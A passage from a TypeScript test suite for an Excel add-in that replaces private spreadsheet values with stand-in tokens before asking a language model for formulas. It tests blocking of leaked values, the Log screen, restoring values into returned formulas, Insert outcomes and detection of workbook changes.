  });

  it("an automatic reading can be undone by keeping the part as typed", async () => {
    const { flow } = await setup();
    const p = flow.prepare("Total Amount for Kenji", "structure_only", 50, new Map([["kenji", []]]));
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.partial.auto).toEqual([]);
    expect(p.prepared.partial.kept).toEqual([{ key: "kenji", fragment: "Kenji" }]);
    expect(p.prepared.outcome.ok).toBe(false);
  });

  it("shows a candidate's cells in Excel and puts the selection back, selecting only", async () => {
    const host = fakeHost(twoMarias());
    const selections = withSelect(host);
    const { flow } = await setup([], host);
    expect(flow.canShowCells()).toBe(true);
    expect(await flow.showCells("Orders", ["A2", "A5"])).toEqual({ ok: true });
    await flow.restoreSelection();
    expect(selections).toEqual([
      { sheet: "Orders", cells: ["A2", "A5"] },
      { sheet: "Orders", cells: ["A1:C6"] },
    ]);
    expect(host.inserts).toEqual([]);
  });

  it("puts back the cells the user selected, not the block they grew to", async () => {
    const host = fakeHost({ ...twoMarias(), resolution: { kind: "region", from: "B3", exact: "B3" } });
    const selections = withSelect(host);
    const { flow } = await setup([], host);
    await flow.restoreSelection();
    expect(selections).toEqual([{ sheet: "Orders", cells: ["B3"] }]);
  });

  it("without a host that can select, Show in sheet isn't offered and says why", async () => {
    const { flow } = await setup();
    expect(flow.canShowCells()).toBe(false);
    expect(await flow.showCells("Orders", ["A2"])).toEqual({ ok: false, message: COPY.showCellsUnavailable });
  });
});

describe("flow: what a blocked request matched, kept for the Log screen only", () => {
  it("keeps the matched text beside the log entry, and nowhere else", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total for Maria", "structure_only", 50, new Map([["maria", []]]));
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(false);
    // The preview says where, never what.
    expect(p.prepared.status.found).toBe("Found in your question.");

    const items = flow.logItems();
    expect(items).toHaveLength(1);
    expect(items[0]?.entry).toEqual(flow.logEntries()[0]);
    expect(items[0]?.local?.matches).toEqual([
      { column: "A", variant: "word", origin: "value", text: "Maria", before: "Total for ", after: "", where: "your question" },
    ]);

    // Not in the entry, the export, the evaluation report, the history or the state.
    expect(JSON.stringify(flow.logEntries())).not.toContain("Maria");
    expect(flow.exportLog()).not.toContain("Maria");
    expect(flow.exportReport()).not.toContain("Maria");
    expect(JSON.stringify(flow.evalRecords())).not.toContain("Maria");
    expect(JSON.stringify(flow.history())).not.toContain("Maria");
    expect(JSON.stringify(flow.getState())).not.toContain("Maria");

    // Nor in the next request, which goes out as usual.
    const next = flow.prepare("Total Amount per Region", "structure_only");
    if (!next.ok) throw new Error(next.message);
    expect((await flow.send(next.prepared, KEY)).ok).toBe(true);
    expect(model.bodies).toHaveLength(1);
    expect(model.bodies[0]).not.toContain("Maria");
    expect(JSON.stringify(flow.history())).not.toContain("Maria");
    expect(flow.exportLog()).not.toContain("Maria");
    expect(flow.logItems()[1]?.local).toBeUndefined();
  });

  it("a blocked correction retry keeps what it matched beside its entry too", async () => {
    const { flow, model } = await setup(["Sure: Kenji Watanabe bought the most."]);
    const p = flow.prepare("Who bought the most?", "structure_only");
    if (!p.ok || !p.prepared.outcome.ok) throw new Error("expected a pass");
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.retryBlocked });
    expect(model.bodies).toHaveLength(1);
    const [sent, retry] = flow.logItems();
    expect(sent?.local).toBeUndefined();
    expect(retry?.entry.audit.ok).toBe(false);
    expect(retry?.local?.matches?.find((m) => m.variant === "exact")).toEqual({
      column: "A",
      variant: "exact",
      origin: "value",
      text: "Kenji Watanabe",
      before: "Sure: ",
      after: " bought the most.",
      where: "an earlier reply",
    });
    expect(JSON.stringify(retry?.entry)).not.toContain("Kenji");
  });

  it("a renamed header found in a note: the headline names the original header, not a private value", async () => {
    const { flow } = await setup();
    expect(flow.getState().ranges[0]?.columns[1]?.policy.private).toBe(false);
    flow.setPolicy(0, "B", { alias: "Area" });
    flow.setPolicy(0, "C", { note: "sum it by region" });
    const p = flow.prepare("Total Amount per Area", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const { status } = p.prepared;
    expect(status.headline).toBe("Blocked: the original header of column B (renamed under Header sent) is in the request.");
    expect(status.detail).toBe("Text from column B's original header is in the request. Nothing was sent.");
    expect(status.found).toBe("Found in the note on column C.");

    const [item] = flow.logItems();
    expect(item?.entry.error).toBe(status.headline);
    expect(item?.entry.audit.error).toBe(status.detail);
    expect(item?.local?.matches).toEqual([
      { column: "B", variant: "exact", origin: "alias", text: "region", before: "sum it by ", after: "", where: "the note on column C" },
    ]);
    expect(flow.exportLog()).not.toContain("region");
  });

  it("two renamed headers found in two notes: plural wording, both places named", async () => {
    const { flow } = await setup();
    flow.setPolicy(0, "B", { alias: "Area" });
    flow.setPolicy(0, "C", { alias: "Total" });
    flow.setPolicy(0, "A", { note: "sorted by region" });
    flow.setPolicy(0, "B", { note: "per amount" });
    const p = flow.prepare("Total per Area", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const { status } = p.prepared;
    expect(status.headline).toBe("Blocked: the original headers of columns B and C (renamed under Header sent) are in the request.");
    expect(status.detail).toBe("Text from the original headers of columns B, C is in the request. Nothing was sent.");
    expect(status.found).toBe("Found in the note on column A and the note on column B.");
    expect(flow.exportLog()).not.toMatch(/region|amount/iu);
  });

  it("a code match keeps the accent written after it inside the match on screen", async () => {
    const data = rangeData("Orders", "A1:C3", [
      ["Customer", "Code", "Amount"],
      ["Ana Ruiz", "AB-1234-C\u00c9", 100],
      ["Omar Haddad", "ZZ-9999-QQ", 200],
    ]);
    const { flow } = await setup([], fakeHost(data));
    flow.setPolicy(0, "B", { private: true, treatment: "stand_in" });
    flow.setPolicy(0, "C", { note: "ref AB1234CE\u0301 please" });
    const p = flow.prepare("Total Amount", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const m = flow.logItems()[0]?.local?.matches?.find((x) => x.column === "B");
    expect(m?.text).toBe("AB1234CE\u0301");
    expect(m?.after).toBe(" please");
  });

  it("names the place: a sample row by its column (left-out columns skipped), a lookup range's header", async () => {
    const data = rangeData("Orders", "A1:C4", [
      ["Customer", "Region", "Amount"],
      ["Kenji Watanabe", "Watanabe", 100],
      ["Ana Ruiz", "East", 200],
      ["Omar Haddad", "West", 300],
    ]);
    const { flow } = await setup([], fakeHost(data));
    flow.setPolicy(0, "A", { private: true, treatment: "exclude" });
    flow.setPolicy(0, "B", { private: false });
    const rows = flow.prepare("Total Amount per Region", "substituted");
    if (!rows.ok) throw new Error(rows.message);
    expect(rows.prepared.status.found).toBe("Found in a sample row in column B.");
    expect(flow.logItems()[0]?.local?.matches).toEqual([
      { column: "A", variant: "word", origin: "value", text: "Watanabe", before: "", after: "", where: "a sample row in column B" },
    ]);

    const { flow: lookup } = await setup();
    expect((await lookup.addContextRange("Regions!A1:B5")).ok).toBe(true);
    lookup.setPolicy(1, "B", { private: false, alias: "Kenji share" });
    const header = lookup.prepare("Total Amount per Region", "structure_only");
    if (!header.ok) throw new Error(header.message);
    expect(header.prepared.status.found).toBe("Found in a lookup range's header (Regions!B).");
    expect(lookup.logItems()[0]?.local?.matches).toEqual([
      { column: "A", variant: "word", origin: "value", text: "Kenji", before: "", after: " share", where: "a lookup range's header (Regions!B)", inHeader: "Regions!B" },
    ]);
  });

  it("a word of a private value in another column's header: the match says which header", async () => {
    const { flow } = await setup();
    flow.setPolicy(0, "B", { alias: "Lopez region" });
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.status.headline).toBe("Blocked: a value from column A is in the request.");
    expect(p.prepared.status.found).toBe("Found in the header of column B.");
    expect(flow.logItems()[0]?.local?.matches).toEqual([
      { column: "A", variant: "word", origin: "value", text: "Lopez", before: "", after: " region", where: "the header of column B", inHeader: "B" },
    ]);
  });

  it("unescapes the matched text and the text around it, and cuts each side to 32 characters at a word", async () => {
    const { flow } = await setup();
    // Quotes, a newline and backslashes on both sides of the name, and more than 32 characters each way.
    flow.setPolicy(0, "C", { note: 'Mind "gross" vs net\nand C:\\temp\\old files before Kenji Watanabe signs off on the "Q3" totals\\drafts next week' });
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(false);
    expect(flow.logItems()[0]?.local?.matches?.find((m) => m.variant === "exact")).toEqual({
      column: "A",
      variant: "exact",
      origin: "value",
      text: "Kenji Watanabe",
      before: "…and C:\\temp\\old files before ",
      after: ' signs off on the "Q3"…',
      where: "the note on column C",
    });
  });

  it("the text around a match stops where its string does: after a backslash, and in a number cell there is none", async () => {
    const { flow } = await setup();
    flow.setPolicy(0, "C", { note: "trailing slash Kenji Watanabe\\" });
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(flow.logItems()[0]?.local?.matches?.find((m) => m.variant === "exact")).toMatchObject({
      text: "Kenji Watanabe",
      before: "trailing slash ",
      after: "\\",
    });

    // A private salary that is also a number in a column sent as it is.
    const pay = rangeData("Pay", "A1:C5", [
      ["Name", "Salary", "Budget"],
      ["Maria Lopez", 83517, 83517],
      ["Ana Ruiz", 91234, 1000],
      ["Kenji Watanabe", 77321, 2000],
      ["Omar Haddad", 65432, 3000],
    ]);
    const { flow: numbers } = await setup([], fakeHost(pay));
    numbers.setPolicy(0, "B", { private: true, treatment: "stand_in" });
    numbers.setPolicy(0, "C", { private: false, treatment: "as_is" });
    const rows = numbers.prepare("Total Budget per Name", "substituted");
    if (!rows.ok) throw new Error(rows.message);
    expect(numbers.logItems()[0]?.local?.matches).toEqual([
      { column: "B", variant: "exact", origin: "value", text: "83517", before: "", after: "", where: "a sample row in column C" },
    ]);
  });

  it("a blocked correction retry: a quoted name under a reply key the check doesn't know is unescaped too", async () => {
    const bad = JSON.stringify({ kind: "answer", formula: null, placement: null, assumptions: [], explanation: "x", extra: 'Ask "Kenji Watanabe" now' });
    const { flow } = await setup([bad]);
    const p = flow.prepare("Who bought the most?", "structure_only");
    if (!p.ok || !p.prepared.outcome.ok) throw new Error("expected a pass");
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.retryBlocked });
    expect(flow.logItems()[1]?.local?.matches?.find((m) => m.variant === "exact")).toEqual({
      column: "A",
      variant: "exact",
      origin: "value",
      text: "Kenji Watanabe",
      before: 'Ask "',
      after: '" now',
      where: "an earlier reply",
    });
  });

  it("a renamed private column whose value and original header are both in the request: named as a value, both on the Log", async () => {
    const data = rangeData("Orders", "A1:C4", [
      ["Customer", "Nickname", "Amount"],
      ["Maria Lopez", "Lulubelle", 100],
      ["Ana Ruiz", "Bobcat", 200],
      ["Kenji Watanabe", "Tiger", 300],
    ]);
    const { flow } = await setup([], fakeHost(data));
    flow.setPolicy(0, "B", { private: true, treatment: "stand_in", alias: "Handle" });
    flow.setPolicy(0, "C", { note: "nickname Lulubelle" });
    const p = flow.prepare("Total Amount per Handle", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.status.headline).toBe("Blocked: a value from column B is in the request.");
    expect(p.prepared.status.detail).toBe("Text from private column B is in the request. Nothing was sent.");
    const matches = flow.logItems()[0]?.local?.matches ?? [];
    expect(matches.map((m) => [m.column, m.variant, m.origin, m.text])).toEqual(
      expect.arrayContaining([
        ["B", "exact", "value", "Lulubelle"],
        ["B", "exact", "alias", "nickname"],
      ]),
    );
    expect(flow.exportLog()).not.toMatch(/lulubelle|nickname/i);

    // Whichever the audit recorded first, a value match means the headline names a value.
    const result = { ok: false, hits: [{ column: "B", variant: "exact" as const }], structural: [] };
    const alias = { column: "B", variant: "exact" as const, origin: "alias" as const };
    const value = { ...alias, origin: "value" as const };
    expect(auditStatus(result, [alias, value]).headline).toBe("Blocked: a value from column B is in the request.");
    expect(auditStatus(result, [value, alias]).headline).toBe("Blocked: a value from column B is in the request.");
    expect(auditStatus(result, [alias]).headline).toBe("Blocked: the original header of column B (renamed under Header sent) is in the request.");
    expect(auditStatus(result, []).headline).toBe("Blocked: a value from column B is in the request.");
  });
});

// ---------------------------------------------------------------------------------------------
// Release-hardening review, 2026-09-28: what Insert reports, and stand-ins a reply needs that this
// session never created. Written before the fixes, to reproduce each finding.

describe("flow: what Insert reports once the formula is written", () => {
  type Out = { address: string; excelError?: boolean; check?: "ok" | "error" | "manual" | "unverified"; fillFailed?: boolean };

  async function insertWith(result: Out | Error, fillDown = false) {
    const host = fakeHost();
    host.adapter.insertFormula = async (sheet, cell, formula, fill, lastRow) => {
      host.inserts.push({ sheet, cell, formula, fillDown: fill, lastRow });
      if (result instanceof Error) throw result;
      return result;
    };
    const formula = fillDown ? '=IF(A2="PERSON_001",C2,0)' : '=SUMIFS(C2:C7,A2:A7,"PERSON_001")';
    const { flow } = await setup([reply({ kind: "formula", formula, placement: { cell: "D2", fill_down: fillDown }, explanation: "x" })], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    const out = await flow.insert(sent.result.id, "D2", fillDown);
    return { flow, host, out };
  }

  it("written and checked: plain success", async () => {
    const { flow, out } = await insertWith({ address: "Orders!D2", check: "ok", excelError: false });
    expect(out).toEqual({ ok: true, check: "ok", message: "Inserted in D2.", address: "D2" });
    expect(flow.evalRecords()[0]).toMatchObject({ inserted: true, excelError: false });
  });

  it("written, but Excel shows an error in the result: not reported as plain success", async () => {
    const { flow, out } = await insertWith({ address: "Orders!D2", check: "error", excelError: true });
    expect(out).toMatchObject({ ok: true, check: "error", address: "D2" });
    if (!out.ok) throw new Error("expected a written outcome");
    expect(out.message).toBe(COPY.insertedError("D2"));
    expect(out.message).not.toBe(COPY.inserted("D2"));
    expect(flow.logEntries()[0]?.inserted).toBe(true);
    expect(flow.evalRecords()[0]).toMatchObject({ inserted: true, excelError: true });
  });

  it("written while the workbook calculates manually: says the result isn't checked yet", async () => {
    const { flow, out } = await insertWith({ address: "Orders!D2", check: "manual" });
    expect(out).toEqual({ ok: true, check: "manual", message: COPY.insertedManual("D2"), address: "D2" });
    expect("excelError" in (flow.evalRecords()[0] ?? {})).toBe(false);
  });

  it("written, but reading the result back failed: written, not a failure, and not retried", async () => {
    const { flow, host, out } = await insertWith({ address: "Orders!D2", check: "unverified" });
    expect(out).toEqual({ ok: true, check: "unverified", message: COPY.insertedUnverified("D2"), address: "D2" });
    expect(host.inserts).toHaveLength(1);
    expect(flow.logEntries()[0]?.inserted).toBe(true);
    expect(flow.evalRecords()[0]?.inserted).toBe(true);
  });

  it("fill down failed after the first cell was written: says only that cell was written", async () => {
    const { out } = await insertWith({ address: "Orders!D2", check: "unverified", fillFailed: true }, true);
    expect(out).toEqual({ ok: true, check: "unverified", message: COPY.insertedFillFailed("D2", "D2:D7"), address: "D2" });
  });

  it("not written: an adapter error is a failure, and the log and report say nothing was inserted", async () => {
    const { flow, out } = await insertWith(new Error("AccessDenied"));
    expect(out).toEqual({ ok: false, message: COPY.insertFailed });
    expect(flow.logEntries()[0]?.inserted).toBe(false);
    expect(flow.evalRecords()[0]?.inserted).toBe(false);
  });
});

describe("flow: stand-ins a reply needs that this session never created", () => {
  async function resultOf(formula: string, explanation = "Adds Amount.", host = fakeHost(), question = "Total Amount for Maria Lopez") {
    const { flow } = await setup([reply({ kind: "formula", formula, placement: { cell: "D2", fill_down: false }, explanation })], host);
    const p = flow.prepare(question, "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    return { flow, host, r: sent.result };
  }

  it("a formula whose criterion is a never-issued stand-in passes the gate but can't be inserted or copied", async () => {
    const { flow, host, r } = await resultOf('=SUMIFS(C2:C7,A2:A7,"PERSON_099")');
    expect(r.gate?.ok).toBe(true); // safe to run...
    expect(r.unresolvedTokens).toEqual(["PERSON_099"]); // ...but it would compare against a stand-in, not a value
    expect(r.canInsert).toBe(false);
    expect(flow.copyText(r.id)).toBeNull();
    expect(await flow.insert(r.id, "D2", false)).toEqual({ ok: false, message: COPY.insertUnresolved });
    expect(host.inserts).toEqual([]);
  });

  it("a stand-in whose NYMFORM_ prefix the model dropped is unresolved too", async () => {
    const data = rangeData("Orders", "A1:D7", [
      ["Customer", "Region", "Amount", "Code"],
      ["Maria Lopez", "East", 100, "PERSON_050"],
      ["Ana Ruiz", "West", 200, "X"],
      ["Kenji Watanabe", "East", 300, "X"],
      ["Priya Natarajan", "West", 400, "X"],
      ["Maria Lopez", "East", 500, "X"],
      ["Omar Haddad", "East", 600, "X"],
    ]);
    const { r } = await resultOf('=SUMIFS(C2:C7,A2:A7,"PERSON_001")', "x", fakeHost(data));
    expect(r.unresolvedTokens).toEqual(["PERSON_001"]);
    expect(r.canInsert).toBe(false);
  });

  it("with the NYMFORM_ prefix, an unprefixed look-alike that is text from the sheet is not unresolved", async () => {
    const data = rangeData("Orders", "A1:D7", [
      ["Customer", "Region", "Amount", "Code"],
      ["Maria Lopez", "East", 100, "PERSON_050"],
      ["Ana Ruiz", "West", 200, "X"],
      ["Kenji Watanabe", "East", 300, "X"],
      ["Priya Natarajan", "West", 400, "X"],
      ["Maria Lopez", "East", 500, "PERSON_050"],
      ["Omar Haddad", "East", 600, "X"],
    ]);
    const { r } = await resultOf('=SUMIFS(C2:C7,A2:A7,"NYMFORM_PERSON_001",D2:D7,"PERSON_050")', "x", fakeHost(data));
    expect(r.formula).toBe('=SUMIFS(C2:C7,A2:A7,"Maria Lopez",D2:D7,"PERSON_050")');
    expect(r.unresolvedTokens).toEqual([]);
    expect(r.canInsert).toBe(true);
  });

  it("a never-issued stand-in only in the explanation is a warning; the formula still inserts", async () => {
    const { flow, r } = await resultOf('=SUMIFS(C2:C7,A2:A7,"PERSON_001")', "Same as for PERSON_077 last time.");
    expect(r.unknownTokens).toEqual(["PERSON_077"]);
    expect(r.unresolvedTokens).toEqual([]);
    expect(r.canInsert).toBe(true);
    expect((await flow.insert(r.id, "D2", false)).ok).toBe(true);
  });
});

describe("flow: restored values Excel may read differently than the sheet holds them", () => {
  function staff(format = "General", id: number = 48213): RangeData {
    const data = rangeData("Staff", "A1:C5", [
      ["Employee ID", "Dept", "Salary"],
      [id, "Ops", 100],
      [51120, "Ops", 200],
      [60001, "Sales", 300],
      [72450, "Sales", 400],
    ]);
    data.numberFormat = data.numberFormat.map((row, i) => row.map((f, c) => (i > 0 && c === 0 ? format : f)));
    if (format === "00000") data.text[1]![0] = String(id).padStart(5, "0");
    return data;
  }

  async function resultFor(data: RangeData, question: string, formula: string, mode: "structure_only" | "substituted" = "structure_only") {
    const host = fakeHost(data);
    host.adapter.listSheets = async () => [data.sheet];
    const { flow } = await setup([reply({ kind: "formula", formula, placement: null, explanation: "x" })], host);
    flow.setPolicy(0, "A", { private: true, treatment: "stand_in" });
    const p = flow.prepare(question, mode);
    if (!p.ok) throw new Error(p.message);
    if (!p.prepared.outcome.ok) throw new Error(p.prepared.status.headline);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    return { flow, r: sent.result, sentQuestion: p.prepared.sentQuestion };
  }

  it("a private number comes back as text: the formula is marked before Insert", async () => {
    const { r, sentQuestion } = await resultFor(staff(), "Total Salary for 48213", '=XLOOKUP("ID_001",A2:A5,C2:C5)');
    expect(sentQuestion).toBe("Total Salary for ID_001");
    expect(r.formula).toBe('=XLOOKUP("48213",A2:A5,C2:C5)');
    expect(r.canInsert).toBe(true);
    expect(r.cautions).toEqual([COPY.restoredNumber("ID_001", "A")]);
  });

  it("a number shown with leading zeros comes back as its shown text, and is marked", async () => {
    const { r } = await resultFor(staff("00000", 123), "Total Salary for 00123", '=SUMIFS(C2:C5,A2:A5,"ID_001")');
    expect(r.formula).toBe('=SUMIFS(C2:C5,A2:A5,"00123")');
    expect(r.cautions).toEqual([COPY.restoredNumber("ID_001", "A")]);
  });

  it("a restored value holding * ? or ~ is marked, because criteria read them as wildcards", async () => {
    const data = rangeData("Orders", "A1:C4", [
      ["Customer", "Region", "Amount"],
      ["Lee*Park", "East", 100],
      ["Ana Ruiz", "West", 200],
      ["Lee Park", "East", 300],
    ]);
    const { r } = await resultFor(data, "Total Amount per Customer", '=SUMIFS(C2:C4,A2:A4,"PERSON_001")', "substituted");
    expect(r.formula).toBe('=SUMIFS(C2:C4,A2:A4,"Lee*Park")');
    expect(r.cautions).toEqual([COPY.restoredWildcard("PERSON_001")]);
    expect(r.canInsert).toBe(true);
  });

  it("a private date comes back as its shown text, and is marked", async () => {
    const data = rangeData("Staff", "A1:C4", [
      ["Name", "Start date", "Salary"],
      ["Maria Lopez", 45366, 100],
      ["Ana Ruiz", 45400, 200],
      ["Kenji Watanabe", 45450, 300],
    ]);
    data.numberFormat = data.numberFormat.map((row, i) => row.map((f, c) => (i > 0 && c === 1 ? "m/d/yyyy" : f)));
    data.text[1]![1] = "3/15/2024";
    data.text[2]![1] = "4/18/2024";
    data.text[3]![1] = "6/7/2024";
    const host = fakeHost(data);
    host.adapter.listSheets = async () => ["Staff"];
    // The model echoes whichever stand-in the question went out with.
    const model = fakeModel([]);
    const flow = new Flow({
      adapter: host.adapter,
      model: MODEL,
      send: (outbound, key, signal) => {
        const task = String((JSON.parse(messagesOf(outbound.body).at(-1)!.content) as { task: string }).task);
        const token = /(?:NYMFORM_)?[A-Z]+_\d{3,}/.exec(task)?.[0] ?? "none";
        model.bodies.length = 0;
        return fakeModel([reply({ kind: "formula", formula: `=SUMIFS(C2:C4,B2:B4,"${token}")`, placement: null, explanation: "x" })]).send(outbound, key, signal);
      },
    });
    expect((await flow.refresh()).ok).toBe(true);
    flow.setPolicy(0, "B", { private: true, treatment: "stand_in" });
    const p = flow.prepare("Total Salary for starts on 3/15/2024", "structure_only");
    if (!p.ok) throw new Error(p.message);
    if (!p.prepared.outcome.ok) throw new Error(p.prepared.status.headline);
    const token = /(?:NYMFORM_)?[A-Z]+_\d{3,}/.exec(p.prepared.sentQuestion)?.[0];
    expect(token).toBeDefined();
    expect(p.prepared.sentQuestion).not.toContain("3/15/2024");
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.formula).toBe('=SUMIFS(C2:C4,B2:B4,"3/15/2024")');
    expect(sent.result.canInsert).toBe(true);
    expect(sent.result.cautions).toEqual([COPY.restoredNumber(token!, "B")]);
  });

  it("an ordinary text value brings no caution", async () => {
    const { r } = await resultFor(orders(), "Total Amount for Maria Lopez", '=SUMIFS(C2:C7,A2:A7,"PERSON_001")');
    expect(r.cautions).toEqual([]);
  });
});

describe("flow: the workbook changed after the ranges were read (spec §7.1, review 2026-09-28)", () => {
  function edited(data: RangeData, cells: Record<string, CellValue>): RangeData {
    const copy: RangeData = structuredClone(data);
    for (const [addr, v] of Object.entries(cells)) {
      const m = /^([A-Z]+)(\d+)$/u.exec(addr)!;
      const c = m[1]!.charCodeAt(0) - 65 - copy.columnIndex;
      const r = Number(m[2]) - 1 - copy.rowIndex;
      copy.values[r]![c] = v;
      copy.formulas[r]![c] = v;
      copy.text[r]![c] = v === null ? "" : String(v);
      copy.valueTypes[r]![c] = v === null ? "Empty" : typeof v === "number" ? "Double" : "String";
    }
    return copy;
  }

  it("a private value typed into the sheet after Refresh, then asked about, is never sent", async () => {
    const { flow, host, model } = await setup([SUMIFS_REPLY]);
    // After the pane read the range, a customer's name is changed in Excel.
    host.ranges["Orders!A1:C7"] = edited(orders(), { A3: "Zed Quux" });
    const p = flow.prepare("Total Amount for Zed Quux", "structure_only");
    if (!p.ok) throw new Error(p.message);
    // The session doesn't know the new name, so neither substitution nor the check can see it...
    expect(p.prepared.outcome.ok).toBe(true);
    expect(p.prepared.built.outbound.body).toContain("Zed Quux");
    // ...and Send, reading the range again first, refuses.
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.dataChangedSend });
    expect(model.bodies).toEqual([]);
    expect(flow.getState().stale).toBe(true);
    expect(flow.isCurrent(p.prepared)).toBe(false);
    expect(flow.prepare("Total Amount", "structure_only")).toEqual({ ok: false, message: COPY.dataChanged });

    // Refresh from selection reads the data again: the new name is private, and goes out as a stand-in.
    host.select(host.ranges["Orders!A1:C7"]!);
    expect((await flow.refresh()).ok).toBe(true);
    expect(flow.getState().stale).toBe(false);
    const again = flow.prepare("Total Amount for Zed Quux", "structure_only");
    if (!again.ok) throw new Error(again.message);
    expect(again.prepared.sentQuestion).toBe("Total Amount for PERSON_001");
    expect((await flow.send(again.prepared, KEY)).ok).toBe(true);
    expect(model.bodies[0]).not.toContain("Zed Quux");
  });

  it("a renamed header, or a row inserted inside the range, stops Send", async () => {
    const changes: Record<string, CellValue>[] = [{ B1: "Territory" }, { A2: "Ana Ruiz", A3: "Maria Lopez" }];
    for (const change of changes) {
      const { flow, host, model } = await setup([SUMIFS_REPLY]);
      host.ranges["Orders!A1:C7"] = edited(orders(), change);
      const p = flow.prepare("Total Amount per Region", "structure_only");
      if (!p.ok) throw new Error(p.message);
      expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.dataChangedSend });
      expect(model.bodies).toEqual([]);
    }
  });

  it("a defined name or table added between the answer and Insert stops Insert: nothing is written", async () => {
    for (const kind of ["name", "table"] as const) {
      const host = fakeHost();
      const names: string[] = [];
      const tables: TableInfo[] = [];
      host.adapter.listNames = async () => [...names];
      host.adapter.listTables = async () => [...tables];
      const { flow } = await setup([SUMIFS_REPLY], host);
      const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
      if (!p.ok) throw new Error(p.message);
      const sent = await flow.send(p.prepared, KEY);
      if (!sent.ok) throw new Error(sent.message);
      if (kind === "name") names.push("SUMIFS");
      else tables.push({ name: "Orders", sheet: "Orders", address: "A1:C8" });
      expect(await flow.insert(sent.result.id, "D2", false)).toEqual({ ok: false, message: COPY.dataChangedInsert });
      expect(host.inserts).toEqual([]);
      expect(flow.getState().stale).toBe(true);
    }
  });

  it("a cell edited between the answer and Insert stops Insert", async () => {
    const { flow, host } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    host.ranges["Orders!A1:C7"] = edited(orders(), { C4: 999 });
    expect(await flow.insert(sent.result.id, "D2", false)).toEqual({ ok: false, message: COPY.dataChangedInsert });
    expect(host.inserts).toEqual([]);
  });

  it("a volatile formula's new result, or a number shown as ####, isn't a change", async () => {
    const base = rangeData("Orders", "A1:D4", [
      ["Customer", "Region", "Amount", "Checked"],
      ["Maria Lopez", "East", 100, 46000],
      ["Ana Ruiz", "West", 200, 46000],
      ["Kenji Watanabe", "East", 300, 46000],
    ]);
    for (let r = 1; r < 4; r++) base.formulas[r]![3] = "=TODAY()";
    const { flow, host, model } = await setup([SUMIFS_REPLY], fakeHost(base));
    const later: RangeData = structuredClone(base);
    for (let r = 1; r < 4; r++) later.values[r]![3] = 46001;
    later.text[1]![2] = "####";
    host.ranges["Orders!A1:D4"] = later;
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect((await flow.send(p.prepared, KEY)).ok).toBe(true);
    expect(model.bodies).toHaveLength(1);
    expect(flow.getState().stale).toBe(false);
  });

  it("when the range can't be read again, nothing is sent (fail closed), and trying again works", async () => {
    const { flow, host, model } = await setup([SUMIFS_REPLY]);
    const readRange = host.adapter.readRange;
    host.adapter.readRange = async () => {
      throw new Error("Excel is busy");
    };
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.recheckFailedSend });
    expect(model.bodies).toEqual([]);
    expect(flow.getState().stale).toBe(false);
    host.adapter.readRange = readRange;
    expect((await flow.send(p.prepared, KEY)).ok).toBe(true);
  });

  it("a names read that fails while checking is a failed check, not a change: nothing sent, nothing marked stale", async () => {
    const host = fakeHost();
    let failNames = false;
    host.adapter.listNames = async () => {
      if (failNames) throw new Error("Excel is busy");
      return [];
    };
    const { flow, model } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    failNames = true;
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.recheckFailedSend });
    expect(flow.getState().stale).toBe(false);
    expect(model.bodies).toEqual([]);
    failNames = false;
    expect((await flow.send(p.prepared, KEY)).ok).toBe(true);
  });

  it("a lookup range is checked again too", async () => {
    const { flow, host, model } = await setup([SUMIFS_REPLY]);
    expect((await flow.addContextRange("Regions!A1:B5")).ok).toBe(true);
    const changed = structuredClone(regions());
    changed.values[2]![1] = "Someone Else";
    changed.formulas[2]![1] = "Someone Else";
    host.ranges["Regions!A1:B5"] = changed;
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error(p.message);
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.dataChangedSend });
    expect(model.bodies).toEqual([]);
  });
});

describe("flow: whole-column references are named on the result (review 2026-09-28)", () => {
  it("lists each whole-column reference once, as written", async () => {
    const formula = '=SUMIFS(C:C,A:A,"PERSON_001")+SUMIFS(Orders!$C:$C,A:A,"PERSON_001")';
    const { flow } = await setup([reply({ kind: "formula", formula, placement: null, explanation: "x" })]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.canInsert).toBe(true);
